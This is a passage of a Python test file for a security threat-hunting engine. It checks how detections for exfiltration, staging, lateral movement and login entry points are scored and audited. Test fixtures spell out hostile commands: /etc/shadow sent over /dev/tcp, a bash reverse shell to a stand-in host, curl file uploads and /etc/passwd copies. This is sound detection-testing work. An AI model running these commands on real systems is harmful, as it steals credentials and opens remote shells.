                      process__auid="1000", process__pid=200, process__ppid=500, ts=T0 + timedelta(minutes=1))
    _seed_link(repo, "h1", "L-narrow", "F-A", [root], link_type="process_lineage")
    shell = exec_event("sh", ["bash"], executable="/bin/bash", process__uid="1000", process__euid="1000",
                       process__auid="1000", process__pid=100, process__ppid=50, ts=T0 - timedelta(minutes=20))
    sudo = exec_event("su", ["sudo", "-i"], executable="/usr/bin/sudo", process__uid="1000", process__euid="0",
                      process__auid="1000", process__pid=150, process__ppid=100, ts=T0 - timedelta(minutes=19))
    root_shell = exec_event("rs", ["bash"], executable="/bin/bash", process__uid="0", process__euid="0",
                            process__auid="1000", process__pid=500, process__ppid=150,
                            ts=T0 - timedelta(minutes=19))
    _seed_link(repo, "h1", "L-wide", "F-A", [root, shell, sudo, root_shell], link_type="process_lineage")
    finalize_context(repo, "h1")
    priv = [c for c in repo.candidates("h1") if c["rule_id"] == "context.privilege_probing"]
    assert all(c["lane"] != "high" for c in priv)                          # the broker makes it a lead
    assert not any("euid0unknown" in c["group_key"] and c["lane"] != "context" for c in priv)
    assert any(c["group_key"].startswith("euid0|") and c["lane"] == "lead" for c in priv)


def test_finalize_resume_is_idempotent():
    repo = _repo()
    _seed_anchor(repo, "h1", "F-A", "host.web_shell", [exec_event("fa", ["/bin/sh"], process__pid=9)])
    _seed_link(repo, "h1", "L-A", "F-A", [exec_event("id", ["id"], executable="/usr/bin/id")])
    finalize_context(repo, "h1")
    before = _discovery(repo.candidates("h1"))[0]
    audits = _audit_count(repo, "context.finalize")
    _seed_link(
        repo, "h1", "L-agent", "F-A",
        [exec_event("agent-ps", ["ps", "aux"], executable="/usr/bin/ps")],
        link_type="agent_follow_process_lineage", strength="agent_hypothesis",
    )
    finalize_context(repo, "h1")
    after = _discovery(repo.candidates("h1"))[0]
    assert before == after and _audit_count(repo, "context.finalize") == audits
    assert (after["source_anchor_id"], after["source_link_id"]) == (
        before["source_anchor_id"], before["source_link_id"],
    )


def test_resumed_run_that_adds_a_link_writes_one_audited_update():
    repo = _repo()
    _seed_anchor(repo, "h1", "F-A", "host.web_shell", [exec_event("fa", ["/bin/sh"], process__pid=9)])
    _seed_link(repo, "h1", "L-A", "F-A", [exec_event("id", ["id"], executable="/usr/bin/id")])
    finalize_context(repo, "h1")
    assert _discovery(repo.candidates("h1"))[0]["lane"] == "lead"
    audits = _audit_count(repo, "context.finalize")
    _seed_link(repo, "h1", "L-B", "F-A", [exec_event("uname", ["uname"], executable="/usr/bin/uname"),
                                          exec_event("ss", ["ss"], executable="/usr/bin/ss")])
    finalize_context(repo, "h1")
    final = _discovery(repo.candidates("h1"))[0]
    assert final["lane"] == "high" and _audit_count(repo, "context.finalize") == audits + 1


def test_withdrawal_and_its_audit_are_written_together():
    repo = _repo()
    _seed_anchor(repo, "h1", "F-A", "host.ssh_login_external_source",
                 [exec_event("fa", ["/bin/sh"], process__session_id=42)])
    _seed_link(repo, "h1", "L-ext", "F-A", [auth_event("ext", source="203.0.113.8", phase="login", session=42)],
               link_type="login_session")
    finalize_context(repo, "h1")
    audits = _audit_count(repo, "context.finalize")
    _seed_link(repo, "h1", "L-int", "F-A",
               [auth_event("ext", source="203.0.113.8", phase="login", session=42),
                auth_event("int", source="10.0.0.8", phase="session_open", session=42)],
               link_type="login_session")
    finalize_context(repo, "h1")
    entry = next(c for c in repo.candidates("h1") if c["rule_id"] == "context.entry_point_promotion")
    # the candidate reached the context lane and exactly one audit row accompanied the change.
    assert entry["lane"] == "context" and _audit_count(repo, "context.finalize") == audits + 1


# ------------------------------------------------------------------------------------------------
# Citations vs claims, parse failures, per-tool grammars, and lateral target/lineage matching.
# ------------------------------------------------------------------------------------------------

def test_discovery_cites_every_record_and_claim_total_matches():
    events = [exec_event(f"d{i}", ["cat", "/etc/hosts"], executable="/usr/bin/cat", ts=T0 + timedelta(seconds=i))
              for i in range(15)]
    match = one(PostAccessDiscovery, events)[0]
    cited = [e for e in match.events if e.id.startswith("d")]
    assert len(cited) == 15 and "15 command(s)" in match.claim
    assert len([p for p in match.predicate if p.field == "process.executable"]) == 15


def test_unparseable_shell_c_script_counts_as_partial():
    # A genuinely unmodelled construct (command substitution): still partial, never a clean negative.
    broken = exec_event("b", ["bash", "-c", "cat /etc/shadow > /dev/tcp/1.2.3.4/80 $(id)"],
                        executable="/bin/bash")
    repo = _repo()
    evaluate_context(repo, "h1", anchor(), link(), [broken])
    cell = _cell(repo, "context.staging_and_transfer")
    assert cell["detail"]["missing_required"] >= 1 and cell["state"] != "no_match_complete"


def test_the_final_pass_counts_an_unparseable_script_as_partial_coverage():
    repo = _repo()
    _seed_anchor(repo, "h1", "F-A", "host.web_shell", [exec_event("fa", ["/bin/sh"], process__pid=9)])
    _seed_link(repo, "h1", "L-A", "F-A", [exec_event("b", ["bash", "-c", "cat /etc/shadow > /dev/tcp/1.2.3.4/80 $(id)"],
                                                     executable="/bin/bash")])
    finalize_context(repo, "h1")
    cell = _cell(repo, "context.staging_and_transfer")
    assert cell["detail"]["missing_required"] >= 1 and cell["state"].endswith("_partial")


def test_devtcp_exfil_with_stderr_dup_is_now_parsed_and_matched():
    # A trailing `2>&1` no longer makes the whole script unevaluable: the /dev/tcp write is read.
    event = exec_event("g", ["bash", "-c", "cat /etc/shadow > /dev/tcp/203.0.113.9/443 2>&1"],
                       executable="/bin/bash")
    match = one(StagingAndTransfer, [event])
    assert len(match) == 1 and "T1048" in match[0].notes
    assert "redirects output to /dev/tcp/203.0.113.9/443" in match[0].claim


def test_devtcp_reverse_shell_redirect_is_read_as_outbound():
    # The classic `bash -i >& /dev/tcp/h/p 0>&1` reverse-shell redirect, read as an outbound transfer.
    event = exec_event("rs", ["bash", "-c", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"],
                       executable="/bin/bash")
    match = one(StagingAndTransfer, [event])
    assert len(match) == 1 and "T1048" in match[0].notes
    assert "redirects output to /dev/tcp/203.0.113.9/4444" in match[0].claim


def test_staging_inbound_devtcp_is_ingress_not_transfer():
    inbound = exec_event("i", ["bash", "-c", "cat < /dev/tcp/10.0.0.9/80"], executable="/bin/bash")
    match = one(StagingAndTransfer, [inbound])[0]
    assert "T1105" in match.notes and "T1048" not in match.notes and "reads from" in match.claim


@pytest.mark.parametrize("argv,is_upload", [
    (["curl", "-d", "email=a@b.com", "http://x.test/f"], False),
    (["curl", "--data-raw", "a@b", "http://x.test/f"], False),
    (["curl", "-d", "@/tmp/secret", "http://x.test/f"], True),
    (["curl", "-F", "a=b", "http://x.test/f"], False),
    (["curl", "-F", "file=@/tmp/secret", "http://x.test/f"], True),
])
def test_curl_file_upload_grammar(argv, is_upload):
    match = one(StagingAndTransfer, [exec_event("c", argv, executable="/usr/bin/curl")])
    assert bool(match) == is_upload


def test_scp_push_is_transfer_but_pull_is_ingress():
    push = one(StagingAndTransfer, [exec_event("p", ["scp", "/tmp/a", "user@10.0.0.9:/tmp/"],
                                              executable="/usr/bin/scp")])[0]
    assert "T1021.004" in push.notes and "outbound" in push.claim
    pull = one(StagingAndTransfer, [exec_event("q", ["scp", "user@10.0.0.9:/etc/passwd", "/tmp/"],
                                              executable="/usr/bin/scp")])[0]
    assert "T1105" in pull.notes and "inbound" in pull.claim and pull.proposed_lane == "lead"


def test_zip_recursive_and_tar_chdir_inputs_are_staged():
    zipped = one(StagingAndTransfer, [exec_event("z", ["zip", "-r", "/tmp/out.zip", "/etc"],
                                                executable="/usr/bin/zip")])[0]
    assert "T1560.001" in zipped.notes
    tarred = one(StagingAndTransfer, [exec_event("t", ["tar", "czf", "/tmp/o.tgz", "-C", "/", "etc"],
                                                executable="/bin/tar", process__cwd="/tmp")])[0]
    assert "T1560.001" in tarred.notes and "/etc" in tarred.claim


def test_lateral_cross_target_connect_stays_lead():
    client = exec_event("cl", ["ssh", "10.0.0.9"], executable="/usr/bin/ssh", process__pid=100, ts=T0)
    connect = socket_event("sk", "10.0.0.8", 22, ts=T0 + timedelta(seconds=2))
    connect = connect.model_copy(update={"fields": {**connect.fields, "process.pid": fv(900, "sk:pid"),
                                                    "process.ppid": fv(800, "sk:ppid")}})
    both = one(LateralMovement, [client, connect])
    socket_group = [m for m in both if "addr:10.0.0.8:22" in m.group_key]
    assert socket_group and socket_group[0].proposed_lane == "lead" and "temporal" in socket_group[0].claim


def test_lateral_connect_matched_by_process_lineage_is_high():
    client = exec_event("cl", ["ssh", "jump"], executable="/usr/bin/ssh", process__pid=100, ts=T0)
    connect = socket_event("sk", "10.0.0.9", 22, ts=T0 + timedelta(seconds=2))
    connect = connect.model_copy(update={"fields": {**connect.fields, "process.pid": fv(101, "sk:pid"),
                                                    "process.ppid": fv(100, "sk:ppid")}})
    both = one(LateralMovement, [client, connect])
    high = [m for m in both if "addr:10.0.0.9:22" in m.group_key]
    assert high and high[0].proposed_lane == "high"


@pytest.mark.parametrize("source,expect", [
    ("203.0.113.8", "high"), (None, "lead")])
def test_entry_point_external_high_sourceless_lead(source, expect):
    login = auth_event("lg", source=source, phase="login")
    link_ = ContextLink(id="L", link_type="login_session", strength="observed",
                        key={"process.session_id": 42}, evidence_events=[], status="complete")
    match = EntryPointPromotion().consume_linked(anchor("credential_access"), link_, [login])
    assert len(match) == 1 and match[0].proposed_lane == expect
    if source is None:
        assert "not confirmed external" in match[0].claim


def test_entry_point_internal_source_not_promoted():
    internal = auth_event("in", source="10.0.0.8", phase="login")
    sourceless = auth_event("so", source=None, phase="session_open")
    link_ = ContextLink(id="L", link_type="login_session", strength="observed",
                        key={"process.session_id": 42}, evidence_events=[], status="complete")
    assert EntryPointPromotion().consume_linked(anchor("credential_access"), link_, [internal, sourceless]) == []


def test_the_representative_reach_does_not_depend_on_hunt_specific_ids():
    # One anchor reaches the same session through two links; an identical hunt names them differently.
    def run(lineage_id, session_id):
        repo = _repo()
        _seed_anchor(repo, "h1", "F-A", "host.web_shell", [exec_event("fa", ["/bin/sh"], process__pid=9)])
        _seed_link(repo, "h1", lineage_id, "F-A", [exec_event("id", ["id"], executable="/usr/bin/id"),
                                                    exec_event("uname", ["uname", "-a"], executable="/usr/bin/uname")])
        _seed_link(repo, "h1", session_id, "F-A", [exec_event("ps", ["ps", "aux"], executable="/usr/bin/ps")],
                   link_type="login_session")
        finalize_context(repo, "h1")
        # the report compares hunts with ids mapped to content keys, so the link id itself is masked here
        return [(c["rule_id"], c["lane"], c["claim"].replace(lineage_id, "<L>").replace(session_id, "<L>"),
                 sorted(c["event_ids"]), c["gate_results"]["_finalize_digest"])
                for c in sorted(_discovery(repo.candidates("h1")), key=lambda c: c["claim"])]
    assert run("L-1", "L-2") == run("L-2", "L-1")


def _reach(anchor_id, rule_id, link_id, minutes, events):
    a = ContextAnchor(id=anchor_id, anchor_class="web_shell", lane="urgent", claim="x", events=events,
                      rule_id=rule_id, ts=T0)
    link = ContextLink(id=link_id, link_type="process_lineage", strength="observed", key={"process.pid": 9},
                       evidence_events=events, status="complete", window_start=T0 - timedelta(minutes=minutes),
                       window_end=T0 + timedelta(minutes=minutes))
    return a, link


def test_tied_windows_and_same_record_anchors_choose_by_content_not_ids():
    from romulus.hunt.context import _representative
    events = [exec_event("fa", ["/bin/sh"], process__pid=9)]
    for first, second in (("L-1", "L-2"), ("L-2", "L-1")):          # same evidence at two windows, ids swapped
        pairs = [_reach("F-A", "host.web_shell", first, 5, events), _reach("F-A", "host.web_shell", second, 30, events)]
        _anchor, link = _representative(sorted(pairs, key=lambda p: p[1].id))
        assert link.window_start == T0 - timedelta(minutes=30)       # the content order picks the same window
    for first, second in (("F-1", "F-2"), ("F-2", "F-1")):          # two rules fired on the same record
        pairs = [_reach(first, "host.web_shell", "L-a", 5, events), _reach(second, "ioc.indicator_match", "L-b", 5, events)]
        anchor, _link = _representative(sorted(pairs, key=lambda p: p[0].id))
        assert anchor.rule_id == "host.web_shell"


def test_a_session_less_lineage_group_key_is_the_same_in_identical_hunts():
    from romulus.detect.context import _session_key
    record = exec_event("x", ["id"], executable="/usr/bin/id")
    record = record.model_copy(update={"fields": {k: v for k, v in record.fields.items() if k != "process.session_id"}})
    anchor_events = [exec_event("fa", ["/bin/sh"], process__pid=9)]
    one = ContextAnchor(id="F-aaaa", anchor_class="web_shell", lane="urgent", claim="x", events=anchor_events,
                        rule_id="host.web_shell")
    two = ContextAnchor(id="F-bbbb", anchor_class="web_shell", lane="urgent", claim="x", events=anchor_events,
                        rule_id="host.web_shell")
    assert _session_key(record, one) == _session_key(record, two)
    assert "F-aaaa" not in str(_session_key(record, one))
